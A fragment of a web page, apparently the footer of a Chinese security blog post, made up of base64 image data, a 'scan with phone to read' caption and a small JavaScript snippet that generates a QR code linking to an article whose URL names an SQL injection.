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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxBusinessPriceActiveReports-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 